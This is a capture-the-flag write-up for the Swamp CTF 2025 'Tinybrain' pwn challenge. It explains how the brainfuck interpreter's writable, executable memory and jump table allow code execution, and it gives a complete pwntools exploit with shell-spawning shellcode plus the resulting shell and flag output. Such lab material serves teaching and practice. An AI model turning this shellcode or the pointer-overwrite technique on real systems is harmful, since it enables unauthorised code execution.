---
title: Tinybrain
date: 2025-03-30T18:09:17+03:00
description: Writeup for Tinybrain [Swamp CTF 2025]
author: sunbather
tags:
- pwn
draft: false
---
___

## Challenge Description

Optimized for the minimum footprint... if you ignore the jump tables...

Note: bf should be called with a file. The remote runs a script that is not provided, of which makes a file from your input.

## Intuition

We're given a brainfuck interpreter that takes interprets the program found in the filename passed as its first argument. Let's look at it dynamically:

```
$ gdb --args bf payload
pwndbg> start
   0x401000    lea    r13, [0x403800]                 R13 => 0x403800 ◂— 0
   0x401008    xor    r14, r14                        R14 => 0
   0x40100b    mov    rdi, qword ptr [rsp + 0x10]     RDI, [0x7fffffffdef0] => 0x7fffffffe270 ◂— 0x64616f6c796170 /* 'payload' */
   0x401010    mov    eax, 2                          EAX => 2
   0x401015    xor    esi, esi                        ESI => 0
   0x401017    xor    edx, edx                        EDX => 0
   0x401019    syscall  <SYS_open>
   0x40101b    mov    r12, rax
   0x40101e    call   0x40102a                    <0x40102a>
 
   0x401023    jmp    qword ptr [rax*8 + 0x402000]
 
   0x40102a    inc    r14
```

We can see that the our file "payload" is opened through the `open()` syscall.
Then the function at `0x40102a` is called. Let's see it:

```
   0x40102a    inc    r14                         R14 => 1
   0x40102d    xor    eax, eax                    EAX => 0
   0x40102f    mov    rdi, r12                    RDI => 3
   0x401032    lea    rsi, [rsp - 1]              RSI => 0x7fffffffded7 ◂— 0x40102300
   0x401037    mov    byte ptr [rsi], 0           [0x7fffffffded7] => 0
   0x40103a    mov    edx, 1                      EDX => 1
   0x40103f    syscall  <SYS_read>
   0x401041    movzx  eax, byte ptr [rsp - 1]
   0x401046    ret 
       ↓
   0x401023    jmp    qword ptr [rax*8 + 0x402000] <0x401047>
```

Then we can see the file is read one byte at the time and put into EAX.
Which is further used for the jump table after the ret.
The jump table calls the appropriate handler for the brainfuck instruction extracted from the file.
There is a huge array of pointers at `0x402000` which each map a character to a function. Most of them are NOPs.

Let's check out the register values after the first read character:

```
 RAX  0x2b
 RBX  0
 RCX  0x401041 ◂— movzx eax, byte ptr [rsp - 1] /* 0x8348c3ff2444b60f */
 RDX  1
 RDI  3
 RSI  0x7fffffffded7 ◂— 0x4010232b
 R8   0
 R9   0
 R10  0
 R11  0x346
 R12  3
 R13  0x403800 ◂— 0
 R14  1
 R15  0
 RBP  0
 RSP  0x7fffffffded8 —▸ 0x401023 ◂— jmp qword ptr [rax*8 + 0x402000] /* 0x4900402000c524ff */
 RIP  0x401046 ◂— ret  /* 0x4528412ce88348c3 */
```

We can see we have a memory address in R13, a counter in R14, and the extracted character in RAX.
R13 (the memory address) is also used as a pointer to write to.
Specifically, when the character `+` or `-` are used, the following handler adds, or substracts 1 from the value R13 points at:

```
   0x401047    sub    rax, 0x2c              RAX => 0xffffffffffffffff (0x2b - 0x2c)
   0x40104b    sub    byte ptr [r13], al     [0x403800] => 1 (0x0 - 0xff)
   0x40104f    jmp    0x40101e                    <0x40101e>
```

Basically, R13 points towards the memory of our brainfuck program. Additionally, you can navigate through it with the `>` and `<` characters:

```
   0x401051    sub    rax, 0x3d                        RAX => 1 (0x3e - 0x3d)
   0x401055    add    r13, rax                         R13 => 0x403801 (0x403800 + 0x1)
   0x401058    jmp    0x40101e                    <0x40101e>
```

Now, interestingly, the program's memory is RWX:

```
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File
          0x401000           0x404000 rwxp     3000   1000 /home/costinteo/Programming/ctf/swampctf/pwn/tinybrain/bf
    0x7ffff7ff9000     0x7ffff7ffd000 r--p     4000      0 [vvar]
    0x7ffff7ffd000     0x7ffff7fff000 r-xp     2000      0 [vdso]
    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]
0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]
```

So the idea is as such:

1. Write shellcode in the program memory starting from `0x403800` by increasing each byte one by one.
2. Move back with a bunch of `<` characters to go to `0x402000`, where the array of function pointers starts.
3. Change a few bytes for the NULL character handler to point to `0x403800`, the beginning of the shellcode.
4. Send a NULL byte.
5. ???
6. Win.

## Solution

Python script below. Have fun:

```py
#!/usr/bin/env python3

from pwn import *

# Just spawns a shell
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

cf = b">"
cb = b"<"
a  = b"+"
s  = b"-"

payload = b""

# Write shellcode
for c in shellcode:
    for i in range(c):
        payload += a
    payload += cf

offset = 0x403800 - 0x402000

# Get to array of ptrs
payload += offset * cb + len(shellcode) * cb

# Decrease first byte of the first pointer
for i in range(0xac):
    payload += s

payload += cf

# Increase first byte of the first pointer
for i in range(0x28):
    payload += a

# Trigger
payload += b"\x00"

open("./payload", "wb").write(payload)

target = remote("chals.swampctf.com", 41414)

target.send(payload + b"q") # Need 'q' for the remote program to finish input
target.interactive()
```

### Flag

```
$ ./solve.py 
[+] Opening connection to chals.swampctf.com on port 41414: Done
[*] Switching to interactive mode
Insert brainfuck instructions (q to finish):
$ id
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu)
$ cat flag.txt
swampCTF{1_W4s_re4L1y_Pr0ud_of_th15_b1N}
```
